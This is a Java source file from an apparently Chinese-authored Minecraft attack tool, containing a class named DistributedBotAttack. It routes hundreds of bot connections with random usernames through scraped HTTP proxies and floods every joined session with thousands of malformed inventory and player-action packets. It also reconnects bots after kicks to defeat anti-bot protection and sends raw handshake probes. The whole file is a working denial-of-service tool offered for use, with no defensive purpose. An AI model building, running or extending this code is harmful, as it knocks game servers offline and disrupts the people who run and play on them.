package co.akarin.endminecraftultra.ATTACK;

import java.io.InputStream;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.Proxy;
import java.net.Socket;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.concurrent.*;
import java.util.concurrent.atomic.AtomicInteger;
import com.github.steveice10.mc.protocol.MinecraftProtocol;
import com.github.steveice10.mc.protocol.data.game.entity.metadata.ItemStack;
import com.github.steveice10.mc.protocol.data.game.entity.object.Direction;
import com.github.steveice10.mc.protocol.data.game.entity.player.PlayerAction;
import com.github.steveice10.mc.protocol.data.game.inventory.ContainerAction;
import com.github.steveice10.mc.protocol.data.game.inventory.ContainerActionType;
import com.github.steveice10.mc.protocol.packet.ingame.clientbound.*;
import com.github.steveice10.mc.protocol.packet.ingame.serverbound.inventory.ServerboundContainerClickPacket;
import com.github.steveice10.mc.protocol.packet.ingame.serverbound.level.ServerboundMoveVehiclePacket;
import com.github.steveice10.mc.protocol.packet.ingame.serverbound.player.ServerboundPlayerActionPacket;
import com.github.steveice10.packetlib.ProxyInfo;
import com.github.steveice10.packetlib.Session;
import com.github.steveice10.packetlib.event.session.*;
import com.github.steveice10.packetlib.packet.Packet;
import com.github.steveice10.packetlib.tcp.TcpClientSession;
import com.github.steveice10.packetlib.tcp.TcpSession;
import co.akarin.endminecraftultra.utils.mainUtils;
import co.akarin.endminecraftultra.proxy.ProxyPool;
import com.nukkitx.math.vector.Vector3i;

public class DistributedBotAttack extends IAttack{

    private Thread mainThread;
    private Thread tabThread;
    private Thread taskThread;
    private Thread packetFloodThread;
    private boolean antiAntiBotMode = true;
    private boolean packetFlood;
    public final List<TcpSession> clients = new CopyOnWriteArrayList<>();
    public ExecutorService pool=Executors.newCachedThreadPool();

    private long starttime;
    public DistributedBotAttack(int time,int maxconnect,int joinsleep,boolean motdbefore,boolean tab,boolean packet1Flood,HashMap<String,String> modList,boolean antiAntiBot) {
        super(time,maxconnect,joinsleep,motdbefore,tab,modList);
        this.packetFlood = packet1Flood;
        this.antiAntiBotMode = antiAntiBot;
    }

    public void start(final String ip,final int port) {
        this.starttime=System.currentTimeMillis();
        mainThread=new Thread(()->{
            while(true) {
                try {
                    cleanClients();
                    createClients(ip,port);
                    mainUtils.sleep(1*1000);
                    if(this.attack_time>0&&(System.currentTimeMillis()-this.starttime)/1000>this.attack_time) {
                        clients.forEach(c-> c.disconnect(""));
                        stop();
                        return;
                    }
                    ProxyPool.getProxysFromAPIs();
                    ProxyPool.getProxysFromFile();
                    mainUtils.log("BotThread", "连接数:"+clients.size());
                }catch(Exception e){
                    mainUtils.log("BotThread",e.getMessage());
                }
            }
        });
        if(this.attack_tab) {
            tabThread=new Thread(()-> {
                while(true) {
                        clients.forEach(c->{
                            if(c.isConnected()) {
                                if(c.hasFlag("join")) {
                                    sendTab(c,"/");
                                }
                            }
                        });
                    mainUtils.sleep(5);
                }
            });
        }
        if(this.packetFlood){
            packetFloodThread = new Thread(()->{
                mainUtils.log("FloodWorker","PacketFlooder started!");
                while(true) {
                    clients.forEach(c->{
                        if(c.isConnected()) {
                            if(c.hasFlag("join")) {
                               packetFlood(c);
                            }
                        }
                    });
                    mainUtils.sleep(50);
                }

            });
        }
        mainThread.start();
        if (this.packetFlood) packetFloodThread.start();
        if(tabThread!=null) tabThread.start();
        if(taskThread!=null) taskThread.start();
    }

    @SuppressWarnings("deprecation")
    public void stop() {
        mainThread.stop();
        if(tabThread!=null) tabThread.stop();
        if(taskThread!=null) taskThread.stop();
    }
    public void packetFlood(Session session){
        for (int i=0;i<1000;i++){
            session.send(new ServerboundContainerClickPacket(0, 14, -1, ContainerActionType.SHIFT_CLICK_ITEM, new ContainerAction() {
                @Override
                public int hashCode() {
                    return super.hashCode();
                }
            }, new ItemStack(23), new HashMap<Integer, ItemStack>()));
            session.send(new ServerboundPlayerActionPacket(PlayerAction.SWAP_HANDS,Vector3i.ONE, Direction.EAST,69));
        }
    }
    public void setTask(Runnable task) {
        taskThread=new Thread(task);
    }

    private void cleanClients() {
        List<TcpSession> waitRemove= new ArrayList<>();
            clients.forEach(c->{
                if(!c.isConnected()) {
                    waitRemove.add(c);
                }
            });
            clients.removeAll(waitRemove);
    }

    private void createClients(final String ip,int port) {
        ProxyPool.proxys.forEach(p -> {
            try {
                String[] _p = p.split(":");
                ProxyInfo proxy = new ProxyInfo(ProxyInfo.Type.HTTP, new InetSocketAddress(_p[0], Integer.parseInt(_p[1])));
                Proxy p1 = new Proxy(Proxy.Type.HTTP, new InetSocketAddress(_p[0], Integer.parseInt(_p[1])));
                TcpSession client = createClient(ip, port, mainUtils.getRandomString(4,12),proxy);
                client.setReadTimeout(10 * 1000);
                client.setWriteTimeout(10 * 1000);
                clients.add(client);
                if (this.attack_motdbefore) {
                    pool.submit(() -> {
                        getMotd(p1, ip, port);
                        client.connect(false);
                    });
                } else {
                    client.connect(false);
                }
                if (this.attack_maxconnect > 0 && (clients.size() > this.attack_maxconnect)) return;
                if (this.attack_joinsleep > 0) mainUtils.sleep(attack_joinsleep);
            } catch (Exception e) {
                mainUtils.log("BotThread/CreateClients", e.getMessage());
            }
        });
    }
    public TcpClientSession createClient(final String ip, int port, final String username, ProxyInfo proxy) {
        AtomicInteger connectCountDown = new AtomicInteger(5); //wangxyper
        TcpClientSession client=new TcpClientSession(ip,port,new MinecraftProtocol(username), proxy);
        client.addListener(new SessionListener() {
            public void packetReceived(Session e, Packet packet) {
                if(packet instanceof ClientboundLoginPacket){
                    e.setFlag("join",true);
                    mainUtils.log("Client","[连接成功]["+username+"]");
                }
            }
            @Override
            public void packetSending(PacketSendingEvent event) {}
            @Override
            public void packetSent(Session session, Packet packet) {}
            @Override
            public void packetError(PacketErrorEvent packetErrorEvent) {}
            public void connected(ConnectedEvent e){}
            public void disconnecting(DisconnectingEvent e){}
            public void disconnected(DisconnectedEvent e){
                String msg;
                if(e.getCause()!=null) {
                    msg=e.getCause().getMessage();
                }else{
                    msg=e.getReason();
                }
                mainUtils.log("Client","[断开连接]["+username+"] " +msg);
                //wangxyper --start --Use the antiAntiBot mode
                if (antiAntiBotMode) {
                    connectCountDown.decrementAndGet();
                    if (connectCountDown.get() >= 0) {
                        try {
                            Thread.sleep(10000);
                        } catch (InterruptedException e1) {
                            e1.printStackTrace();

                        }
                        e.getSession().connect(false);
                    }else{
                        clients.remove(e.getSession());
                    }
                }
                //wangxyper --end
            }
        });
        return client;
    }

    public void getMotd(Proxy proxy, String ip, int port) {
        try {
            Socket socket=new Socket(proxy);
            socket.connect(new InetSocketAddress(ip, port));
            if (socket.isConnected()) {
                OutputStream out=socket.getOutputStream();
                InputStream in=socket.getInputStream();
                out.write(new byte[] {0x07,0x00,0x05,0x01,0x30,0x63,(byte)0xDD,0x01});
                out.write(new byte[] {0x01,0x00});
                out.flush();
                in.read();
                try {
                    in.close();
                    out.close();
                    socket.close();
                } catch (Exception ignored) {}

                return;
            }
            socket.close();
        } catch (Exception ignored) {}
    }

    public void sendTab(Session session,String text) {
        //不要用反射了
       //this code part has some wrong. I discard this code part.
       /*try {
            Class<?> cls= ClientboundTabListPacket.class;
            Constructor<?> constructor=cls.getDeclaredConstructor();
            constructor.setAccessible(true);
            ClientboundTabListPacket packet=(ClientboundTabListPacket) constructor.newInstance();
            Field field = cls.getDeclaredField("text");
            field.setAccessible(true);
            field.set(packet,text);
            session.send(packet);
        } catch (Exception e) {
            e.printStackTrace();
        }*/
        try {
            //ClientboundTabListPacket packet = new ClientboundTabListPacket(new NETabinput(text));
            //session.send(packet);
        }catch (Exception e){}

    }

}
